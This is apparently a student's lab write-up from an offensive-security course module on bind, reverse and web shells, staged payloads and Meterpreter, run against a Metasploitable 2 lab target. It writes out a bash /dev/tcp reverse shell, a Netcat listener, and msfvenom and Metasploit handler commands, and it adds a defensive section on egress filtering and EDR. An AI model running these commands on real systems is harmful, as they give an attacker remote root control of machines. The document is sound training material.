# 🔴 Module 18 — Shells & Payload Concepts

## 📚 What I Learned

A shell is a command-line interface into a compromised system — the mechanism through which everything else in post-exploitation (credential discovery, lateral movement, persistence) actually gets executed. Understanding the different types of shells and how payloads establish them is fundamental to everything that happens after initial access.

**Shell types:**
- **Bind shell** — the target opens a port and listens; the attacker connects to it. Rarely used in real engagements because inbound connections are almost universally blocked by firewalls.
- **Reverse shell** — the attacker listens; the target connects back. Preferred in real engagements because outbound connections are almost never blocked — firewalls are designed to keep things out, not in, and outbound traffic looks like normal network activity.
- **Web shell** — a script uploaded to a web server that accepts commands via HTTP requests, already touched on in Module 13-14's web vulnerability work.

**Payload types:**
- **Stageless** — the entire payload is delivered in one go; self-contained but larger, easier to detect
- **Staged** — a tiny first-stage payload runs, then calls back to download the rest; smaller initial footprint, harder to detect, requires a handler to serve the second stage
- **Meterpreter** — Metasploit's advanced payload; lives entirely in memory (no file written to disk after execution), uses encrypted communication, and has built-in commands for file transfer, screenshots, keylogging, and pivoting

**msfvenom** generates standalone payloads — executables, scripts, or shellcode — for any target OS and architecture, pairing an exploit trigger with a chosen payload type in one command.

**Netcat** (`nc -lvnp <port>`) sets up a simple listener to catch incoming reverse shell connections.

## 🧠 Key Concepts

- **Reverse shells are preferred because of firewall asymmetry** — inbound connections are almost always blocked; outbound are almost always allowed. Reverse shells exploit exactly that reality by having the target initiate the connection.
- **Staged payloads trade size for stealth** — the initial stage is tiny and less likely to trigger detection; the dangerous second stage only arrives after the first stage successfully executes and calls home.
- **Meterpreter's in-memory execution is a significant detection advantage** — disk-based antivirus can't scan something that was never written to disk, and the encrypted channel makes traffic analysis significantly harder.
- **The shell type determines what you can do next** — a basic Netcat shell is fragile and limited; Meterpreter opens the full post-exploitation toolkit.

## 🧪 Practical Lab

### Objective
Demonstrate the full shell progression — from a basic Netcat reverse shell through a staged msfvenom payload to a full Meterpreter session — against an authorized lab target.

### Environment
Kali Linux (192.168.52.129) as attacker, Metasploitable 2 (192.168.52.128) as target, VMware NAT network

### Rules of Engagement
- Target limited strictly to Metasploitable 2
- No payloads executed outside the isolated lab environment

### Tools
Netcat, msfvenom, Metasploit multi/handler, Meterpreter

### Commands

**Part 1 — Netcat reverse shell:**
nc -lvnp 4444
bash -i >& /dev/tcp/192.168.52.129/4444 0>&1

**Part 2 — Staged msfvenom payload:**
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.52.129 LPORT=4444 -f elf -o payload.elf
msfconsole
use exploit/multi/handler
set payload linux/x86/shell/reverse_tcp
set LHOST 192.168.52.129
set LPORT 4444
run

**Part 3 — Meterpreter:**
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.52.129 LPORT=4444 -f elf -o meter.elf
set payload linux/x86/meterpreter/reverse_tcp

## 🔎 Findings

**Part 1 — Netcat reverse shell:**
Listener set up on Kali (nc -lvnp 4444); bash reverse shell executed on target. Connection established immediately — Kali received an interactive root shell from 192.168.52.128. Basic but functional, no encryption, fragile under unstable network conditions.

**Part 2 — Staged payload:**
msfvenom generated a 123-byte ELF binary (linux/x86/shell/reverse_tcp). Multi/handler caught the staged callback, sending the second stage (36 bytes) to the target before opening a command shell session. Smaller initial binary than a stageless equivalent.

**Part 3 — Meterpreter:**
Switching to linux/x86/meterpreter/reverse_tcp payload delivered a full Meterpreter session instead of a basic shell. Confirmed via:
- `sysinfo` — returned OS, hostname, and architecture
- `getuid` — confirmed root
- `upload`/`download` — bidirectional file transfer without leaving additional tooling on disk
- `shell` — dropped into a standard shell from within Meterpreter when needed

## 💡 What I Discovered

The progression from Netcat to staged payload to Meterpreter made the trade-offs between simplicity and capability concrete — each step gains power and stealth but requires more setup. The Meterpreter session's in-memory execution stood out: the payload was gone from disk the moment it ran, leaving significantly less forensic trace than any of the disk-based artifacts from earlier modules.

## 🛡️ Defensive Perspective

- Outbound traffic filtering (egress filtering) directly reduces the effectiveness of reverse shells — blocking outbound connections on unexpected ports significantly raises the bar for establishing callback channels.
- Memory-based payload detection requires behavioral analysis and EDR tooling, not just file-based antivirus — this is exactly why modern security tooling focuses on process behavior rather than file signatures.
- Unusual outbound connections (especially on ports like 4444) should be flagged and investigated — a process making unexpected outbound TCP connections is a strong indicator of malicious activity.
- Meterpreter's encrypted channel makes traffic content-level inspection harder — but connection metadata (unexpected destination IPs, ports, connection frequency) is still detectable with proper network monitoring.

## 📝 Lessons Learned

Shell type and payload choice aren't just technical details — they directly affect detectability, capability, and what's possible in subsequent post-exploitation phases. A Netcat shell gets you in; Meterpreter gets you everything. Understanding why reverse shells dominate real engagements (firewall asymmetry) is as important as knowing how to set one up.

## 🏁 Conclusion

Module 18 formalized shell and payload concepts that had been present throughout earlier modules — from Module 10's Metasploit session to Module 16's msfvenom payload — and demonstrated the full progression from a basic Netcat reverse shell through staged payloads to a Meterpreter session. This sets up directly for Module 19: Post-Exploitation, where that Meterpreter session becomes the foundation for everything that happens after access is established.
